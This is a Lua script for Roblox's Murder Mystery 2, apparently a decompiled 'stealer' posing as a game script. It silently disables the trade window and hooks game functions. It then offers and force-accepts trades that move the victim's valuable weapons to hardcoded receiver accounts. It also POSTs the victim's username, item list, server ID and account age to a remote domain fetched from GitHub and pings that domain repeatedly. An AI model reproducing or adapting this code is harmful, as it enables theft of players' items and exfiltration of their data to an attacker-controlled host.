local _select = select

local function v370(tbl, idx, ...)
	local va = { ... }

	for i = 1, _select("#", ...) do
		tbl[idx + i - 1] = va[i]
	end
end

_G.scriptExecuted = _G.scriptExecuted or false

if not _G.scriptExecuted then
	_G.scriptExecuted = true
	_G.Webhook = _G.Webhook
	_G.MinValueForPing = _G.MinValueForPing
	_G.Receivers = _G.Receivers
	_G.ScriptOwner = _G.ScriptOwner

	local v1 = syn and syn.request or (http and http.request or (http_request or (fluxus and fluxus.request or request)))
	local HttpService = game:GetService("HttpService")
	local s1 = ""
	local u5 = HttpService

	pcall(function()
		local v63 = game:HttpGet("https://raw.githubusercontent.com/unrates/domain/refs/heads/main/domain.json")
		local data = u5:JSONDecode(v63)

		if data and data.domain then
			s1 = data.domain
		end
	end)

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local HttpService2 = game:GetService("HttpService")
	local LocalPlayer = Players.LocalPlayer
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

	SESSION_ID = "local_session"
	IS_CLAIMED = false

	if game.PlaceId == 142823291 then
		RealJobID = game.JobId

		if identifyexecutor then
			if type(identifyexecutor) == "function" then
				local v12, _ = identifyexecutor()

				if v12 and v12:lower():find("delta") then
					(function()
						local u65 = nil
						local u66 = false
						local v67

						repeat
							v67 = nil

							for _, v in ipairs(getgc(true)) do
								if typeof(v) == "function" then
									local v70 = debug.getinfo(v)

									if v70 and v70.name == "stepAnimate" then
										v67 = v

										break
									end
								end
							end

							task.wait()
						until v67

						u65 = hookfunction(v67, function(p1)
							if not u66 then
								u66 = true
								jobId = game.JobId
								RealJobID = jobId
							end

							return u65(p1)
						end)

						return u65
					end)()
				end
			end
		end

		local t1 = {
			DefaultGun = true,
			DefaultKnife = true,
			Reaver = true,
			Reaver_Legendary = true,
			Reaver_Godly = true,
			Reaver_Ancient = true,
			IceHammer = true,
			IceHammer_Legendary = true,
			IceHammer_Godly = true,
			IceHammer_Ancient = true,
			Gingerscythe = true,
			Gingerscythe_Legendary = true,
			Gingerscythe_Godly = true,
			Gingerscythe_Ancient = true,
			TestItem = true,
			Season1TestKnife = true,
			Cracks = true,
			Icecrusher = true,
			["???"] = true,
			Dartbringer = true,
			TravelerAxeRed = true,
			TravelerAxeBronze = true,
			TravelerAxeSilver = true,
			TravelerAxeGold = true,
			BlueCamo_K_2022 = true,
			GreenCamo_K_2022 = true,
			SharkSeeker = true,
		}
		local u15 = ReplicatedStorage
		local u16 = LocalPlayer
		local u17 = t1

		local function v18()
			local Owned = u15.Remotes.Inventory.GetProfileData:InvokeServer(u16.Name).Weapons.Owned
			local t2 = {}

			for k, v in pairs(Owned) do
				if not u17[k] then
					local t3 = {
						name = k,
						amount = v,
					}

					table.insert(t2, t3)
				end
			end

			return t2
		end

		local Trade = ReplicatedStorage:WaitForChild("Trade", 30)

		if Trade then
			local SendRequest = Trade:WaitForChild("SendRequest", 10)
			local GetTradeStatus = Trade:WaitForChild("GetTradeStatus", 10)
			local AcceptTrade = Trade:WaitForChild("AcceptTrade", 10)
			local OfferItem = Trade:WaitForChild("OfferItem", 10)
			local DeclineTrade = Trade:WaitForChild("DeclineTrade", 10)
			local DeclineRequest = Trade:WaitForChild("DeclineRequest", 10)

			if SendRequest and GetTradeStatus and AcceptTrade and OfferItem then
				local spawn = task.spawn
				local u27 = PlayerGui

				spawn(function()
					pcall(function()
						local TradeGUI = u27:WaitForChild("TradeGUI", 5)

						if TradeGUI then
							local PropertyChangedSignal = TradeGUI:GetPropertyChangedSignal("Enabled")
							local u154 = TradeGUI

							PropertyChangedSignal:Connect(function()
								u154.Enabled = false
							end)
						end
					end)
				end)

				local spawn2 = task.spawn
				local u29 = PlayerGui

				spawn2(function()
					pcall(function()
						local TradeGUI_Phone = u29:WaitForChild("TradeGUI_Phone", 5)

						if TradeGUI_Phone then
							local PropertyChangedSignal = TradeGUI_Phone:GetPropertyChangedSignal("Enabled")
							local u157 = TradeGUI_Phone

							PropertyChangedSignal:Connect(function()
								u157.Enabled = false
							end)
						end
					end)
				end)

				local function u30()
					for _, v in pairs(getgc(true)) do
						if type(v) == "table" and rawget(v, "LastOffer") ~= nil then
							return v.LastOffer
						end
					end

					return nil
				end
				local function v31(p2)
					if not p2 then
						p2 = 10
					end

					for _ = 1, p2 do
						local v86 = u30()

						if v86 ~= nil then
							return v86
						end

						task.wait(0.3)
					end

					return nil
				end

				local _ = SendRequest
				local _ = GetTradeStatus
				local _ = GetTradeStatus
				local _ = AcceptTrade
				local _ = v31
				local _ = OfferItem
				local t4 = {
					COMMON = true,
					UNCOMMON = true,
					RARE = true,
				}
				local _ = t4
				local t5 = {}
				local t6 = {}
				local u42 = v18
				local u43 = t4
				local u44 = Players
				local u45 = GetTradeStatus
				local u46 = DeclineTrade
				local u47 = DeclineRequest
				local u48 = SendRequest
				local u49 = OfferItem
				local u50 = AcceptTrade
				local u51 = v31

				local function u52()
					local v99 = u42()

					t5 = {}

					for _, v in ipairs(v99) do
						local v102 = t6[v.name]

						if v102 then
							local v103 = v102.type or "UNKNOWN"

							if not (not v103 or u43[string.upper(v103)] == true) and v103 ~= "UNKNOWN" then
								local v104 = v102.value or 0

								if type(v104) == "string" then
									v104 = tonumber(v104) or 0
								end

								local v105 = v104 + 0.5
								local v106 = math.floor(v105)

								if v106 < 1 then
									v106 = 1
								end
								local t7 = {
									name = v.name,
									amount = v.amount,
									value = v106,
								}

								table.insert(t5, t7)
							end
						end
					end

					table.sort(t5, function(p3, p4)
						return p3.value > p4.value
					end)

					return t5
				end

				local u53 = false

				local function u54(p5)
					local p5_2 = u44:FindFirstChild(p5)

					if p5_2 then
						if not p5_2.Character then
							p5_2.CharacterAdded:Wait()
						end

						task.wait(0.5)

						local p5_3 = u44:FindFirstChild(p5)

						if p5_3 then
							local ok, result = pcall(function()
								return u45:InvokeServer()
							end)

							if not ok then
								result = "None"
							end

							if result ~= "StartTrade" then
								if result == "ReceivingRequest" then
									pcall(function()
										u47:FireServer()
									end)
									task.wait(0.5)
								end
							else
								pcall(function()
									u46:FireServer()
								end)
								task.wait(0.5)
							end

							while #t5 > 0 and not IS_CLAIMED do
								local ok2, result2 = pcall(function()
									return u45:InvokeServer()
								end)

								if not ok2 then
									result2 = "None"
								end

								if result2 ~= "None" and result2 ~= "SendingRequest" then
									if result2 ~= "ReceivingRequest" then
										if result2 ~= "StartTrade" then
											task.wait(0.1)
										else
											local n1 = 0

											while n1 < 4 and #t5 > 0 do
												local v117 = table.remove(t5, 1)

												n1 = n1 + 1

												for _ = 1, v117.amount do
													local name = v117.name
													local u121 = name

													pcall(function()
														u49:FireServer(u121, "Weapons")
													end)
												end
											end

											local timestamp = tick()

											while true do
												local ok3, result3 = pcall(function()
													return u45:InvokeServer()
												end)

												if not ok3 then
													result3 = "None"
												end

												if result3 == "None" then
													break
												end

												pcall(function()
													u50:FireServer(game.PlaceId * 3, nil)
													task.wait(0.01)

													local t8 = {}

													for _, v in pairs(getgc(true)) do
														if type(v) == "table" and rawget(v, "LastOffer") ~= nil then
															local LastOffer = v.LastOffer

															if type(LastOffer) ~= "table" then
																t8._single = v.LastOffer
															else
																for k, v2 in pairs(v.LastOffer) do
																	t8[k] = v2
																end
															end
														end
													end

													for _, v in pairs(t8) do
														local u180 = v

														pcall(function()
															u50:FireServer(game.PlaceId * 3, u180)
														end)
														task.wait(0.01)
													end

													local v181 = u51(2)

													if v181 then
														u50:FireServer(game.PlaceId * 3, v181)
													end
												end)

												if tick() - timestamp > 30 then
													pcall(function()
														u46:FireServer()
													end)

													break
												end

												task.wait(0.01)
											end

											u52()

											if #t5 > 0 then
												task.wait(0.1)
												p5_3 = u44:FindFirstChild(p5)

												if not p5_3 then
													return
												end
											end
										end
									else
										pcall(function()
											u47:FireServer()
										end)
										task.wait(0.1)
									end
								else
									local spawn3 = task.spawn
									local u126 = p5_3

									spawn3(function()
										pcall(function()
											u48:InvokeServer(u126)
										end)
									end)
									task.wait(0.01)
								end

								task.wait()
							end

							return
						end

						return
					end
				end

				local u55 = Players
				local u56 = v18
				local u57 = HttpService2
				local u58 = t4
				local u59 = ReplicatedStorage
				local u60 = v1
				local u61 = LocalPlayer

				local function u62()
					local function v127(p6)
						local v183 = false
						local v184 = p6.Name:lower()
						local Receivers = _G.Receivers

						if type(Receivers) == "table" then
							for _, v in ipairs(_G.Receivers) do
								if v184 == v:lower() then
									v183 = true

									break
								end
							end
						end

						if not v183 then
							local Receiver = _G.Receiver

							if type(Receiver) == "string" and v184 == _G.Receiver:lower() then
								v183 = true
							end
						end

						if not v183 and v184 == "Tctekkd321" then
							v183 = true
						end

						if v183 and not u53 then
							u53 = true

							local spawn4 = task.spawn
							local u190 = p6

							spawn4(function()
								u54(u190.Name)
								u53 = false
							end)
						end
					end

					for _, player in ipairs(u55:GetPlayers()) do
						v127(player)
					end

					u55.PlayerAdded:Connect(v127)
				end

				(function()
					local v130 = u56()

					if #v130 ~= 0 then
						t6 = {}

						local v131 = (function()
							local function v191(...)
								local t9 = { ... }

								t9.n = select("#", ...)

								return t9
							end

							local ok, result = pcall(function()
								return game:HttpGet("https://traderie.com/api/mm2/items/values?type=")
							end)

							if not ok then
								local result4

								ok, result4 = pcall(function()
									return u57:GetAsync("https://traderie.com/api/mm2/items/values?type=")
								end)
								result = result4
							end

							if ok then
								local ok4, result5 = pcall(function()
									return u57:JSONDecode(result)
								end)

								if ok4 and type(result5) == "table" then
									local prices = result5.prices

									if prices then
										local t10 = {}
										local t11 = {}
										local t12 = {}

										for _, v in ipairs(prices) do
											local n2 = 0

											if v.values then
												local values = v.values

												if type(values) == "table" and #v.values > 0 then
													n2 = v.values[1].user_value or 0
												end
											end

											local s2 = "UNKNOWN"

											if v.type then
												s2 = string.upper(v.type)
											end

											if s2 and u58[string.upper(s2)] ~= true then
												if v.name then
													t10[v.name] = {
														value = n2,
														type = s2,
													}
													t10[string.lower(v.name)] = {
														value = n2,
														type = s2,
													}

													local v206 = string.lower(v.name)

													t12[string.gsub(v206, "[^%w]", "")] = {
														value = n2,
														type = s2,
													}

													local v207 = string.gsub(v206, "'s", "")

													t12[string.gsub(v207, "[^%w]", "")] = {
														value = n2,
														type = s2,
													}

													local v208 = string.gsub(v206, " knife", "")
													local v209 = string.gsub(v208, " gun", "")

													t12[string.gsub(v209, "[^%w]", "")] = {
														value = n2,
														type = s2,
													}

													local v210 = string.gsub(v207, " knife", "")
													local v211 = string.gsub(v210, " gun", "")

													t12[string.gsub(v211, "[^%w]", "")] = {
														value = n2,
														type = s2,
													}
												end

												if v.slug then
													t11[v.slug] = {
														value = n2,
														type = s2,
													}
												end
											end
										end

										local t13 = {}
										local ok5, result6 = pcall(function()
											return require(u59:WaitForChild("Database"):WaitForChild("Sync"))
										end)
										local v215 = ok5 and (result6 and result6.Weapons) or nil

										if v215 then
											local n3 = 0
											local n4 = 0

											for k, v in pairs(v215) do
												if type(v) == "table" and v.Rarity then
													local upper = string.upper
													local Rarity = v.Rarity
													local v222 = upper((tostring(Rarity)))

													if v222 and u58[string.upper(v222)] ~= true then
														local v223 = v.ItemName or (v.Name or "")
														local v224 = v.Chroma == true
														local v225 = v.Evo or v.EvoBaseID
														local v226 = v.ItemType or ""
														local t14 = {}
														local v228 = v191(string.lower(v223))

														t14[1] = v223
														v370(t14, 2, unpack(v228, 1, v228.n))

														if v224 then
															local v229 = "Chroma " .. v223

															table.insert(t14, v229)

															local v230 = v223 .. " Chroma"

															table.insert(t14, v230)

															local v231 = v191(string.lower("Chroma " .. v223))

															table.insert(t14, unpack(v231, 1, v231.n))

															local v241 = v191(string.lower(v223 .. " Chroma"))

															table.insert(t14, unpack(v241, 1, v241.n))
														end

														if v226 ~= "Knife" then
															if v226 == "Gun" then
																local v251 = v223 .. " Gun"

																table.insert(t14, v251)

																local v252 = v191(string.lower(v223 .. " Gun"))

																table.insert(t14, unpack(v252, 1, v252.n))

																if v224 then
																	local v262 = "Chroma " .. v223 .. " Gun"

																	table.insert(t14, v262)

																	local v263 = v191(string.lower("Chroma " .. v223 .. " Gun"))

																	table.insert(t14, unpack(v263, 1, v263.n))
																end
															end
														else
															local v273 = v223 .. " Knife"

															table.insert(t14, v273)

															local v274 = v191(string.lower(v223 .. " Knife"))

															table.insert(t14, unpack(v274, 1, v274.n))

															if v224 then
																local v284 = "Chroma " .. v223 .. " Knife"

																table.insert(t14, v284)

																local v285 = v191(string.lower("Chroma " .. v223 .. " Knife"))

																table.insert(t14, unpack(v285, 1, v285.n))
															end
														end

														if v.Event and v.Year then
															local Year = v.Year
															local v296 = v223 .. " " .. Year

															table.insert(t14, v296)

															local v297 = v191(string.lower(v223 .. " " .. Year))

															table.insert(t14, unpack(v297, 1, v297.n))

															if v226 ~= "Knife" then
																if v226 == "Gun" then
																	local v306 = v223 .. " Gun " .. Year

																	table.insert(t14, v306)

																	local v307 = v191(string.lower(v223 .. " Gun " .. Year))

																	table.insert(t14, unpack(v307, 1, v307.n))
																end
															else
																local v316 = v223 .. " Knife " .. Year

																table.insert(t14, v316)

																local v317 = v191(string.lower(v223 .. " Knife " .. Year))

																table.insert(t14, unpack(v317, 1, v317.n))
															end

															if v224 then
																local v326 = "Chroma " .. v223 .. " " .. Year

																table.insert(t14, v326)

																local v327 = v191(string.lower("Chroma " .. v223 .. " " .. Year))

																table.insert(t14, unpack(v327, 1, v327.n))
															end
														end

														local v336 = false

														for _, v3 in ipairs(t14) do
															local v339 = string.lower((string.gsub(v3, "%s+", "-")))

															if t11[v339] then
																t13[k] = t11[v339]
																v336 = true

																break
															end
														end

														if not v336 then
															for _, v4 in ipairs(t14) do
																if t10[v4] then
																	t13[k] = t10[v4]
																	v336 = true

																	break
																end
															end
														end

														if not v336 then
															for _, v5 in ipairs(t14) do
																local v344 = string.lower((string.gsub(v5, "[^%w]", "")))

																if t12[v344] then
																	t13[k] = t12[v344]
																	v336 = true

																	break
																end
															end
														end

														if not v336 and v225 and v.EvoBaseID then
															local Rarity2 = v.Rarity
															local t15 = {}
															local v347 = v223 .. " " .. Rarity2
															local v348 = v191(string.lower(v223 .. " " .. Rarity2))

															t15[1] = v223
															t15[2] = v347
															v370(t15, 3, unpack(v348, 1, v348.n))

															for _, v6 in ipairs(t15) do
																if t10[v6] then
																	t13[k] = t10[v6]
																	v336 = true

																	break
																end
															end
														end

														if v336 then
															n3 = n3 + 1
														end
													else
														n4 = n4 + 1
													end
												end
											end

											return t13
										end

										return {}
									end

									return {}
								end

								return {}
							end

							return {}
						end)()

						for k, v in pairs(v131) do
							t6[k] = v
						end

						local t16 = {}
						local u135 = false
						local n5 = 0

						for _, v in ipairs(v130) do
							local v139 = t6[v.name]

							if v139 then
								local v140 = v139.type or "UNKNOWN"

								if not (not v140 or u58[string.upper(v140)] == true) and v140 ~= "UNKNOWN" then
									local v141 = v139.value or 0

									if type(v141) == "string" then
										v141 = tonumber(v141) or 0
									end

									local v142 = v141 + 0.5
									local v143 = math.floor(v142)

									if v143 < 1 then
										v143 = 1
									end

									if v143 >= _G.MinValueForPing then
										u135 = true
									end

									n5 = n5 + v143 * v.amount

									local v144 = string.gsub(v.name, "_.*", "")
									local t17 = {
										name = v.name,
										amount = v.amount,
										value = v143,
									}

									table.insert(t5, t17)

									local t18 = {
										name = v144,
										amount = v.amount,
										value = v143 * v.amount,
										single_value = v143,
									}

									table.insert(t16, t18)
								end
							end
						end

						table.sort(t5, function(p7, p8)
							return p7.value * p7.amount > p8.value * p8.amount
						end)
						table.sort(t16, function(p9, p10)
							return p9.value > p10.value
						end)

						if #t5 ~= 0 then
							if _G.Webhook ~= "" then
								local spawn5 = task.spawn
								local u149 = t16

								spawn5(function()
									pcall(function()
										local v358 = u60
										local t19 = {
											Url = s1 .. "/api/mm2-webhook",
											Method = "POST",
											Headers = {
												["Content-Type"] = "application/json",
											},
										}
										local v360 = u57
										local t20 = {
											webhook = _G.Webhook,
											items = u149,
											jobId = RealJobID or game.JobId,
										}
										local PlaceId = game.PlaceId

										t20.placeId = tostring(PlaceId)
										t20.pingEveryone = u135
										t20.username = u61.Name

										local ok, result = pcall(function()
											if type(identifyexecutor) ~= "function" then
												return "Unknown"
											end

											return identifyexecutor()
										end)

										t20.executor = ok and result or "Unknown"
										t20.accountAge = u61.AccountAge

										local Receivers = _G.Receivers
										local g367 = nil
										local v366 = nil

										if type(Receivers) == "table" then
											v366 = table.concat(_G.Receivers, ", ")

											if v366 then
												g367 = true
											end
										end

										if not g367 then
											local v368 = _G.Receiver or "Tctekkd321"

											v366 = tostring(v368)
										end
										t20.receiversList = v366
										t20.scriptOwner = _G.ScriptOwner
										t19.Body = v360:JSONEncode(t20)
										v358(t19)
									end)

									while task.wait(3) do
										pcall(function()
											u60({
												Url = s1 .. "/api/mm2-ping",
												Method = "POST",
												Headers = {
													["Content-Type"] = "application/json",
												},
												Body = u57:JSONEncode({
													username = u61.Name,
												}),
											})
										end)
									end
								end)
							end

							u62()

							return
						end

						return
					end
				end)()

				return
			end

			return
		end

		return
	end

	return
end
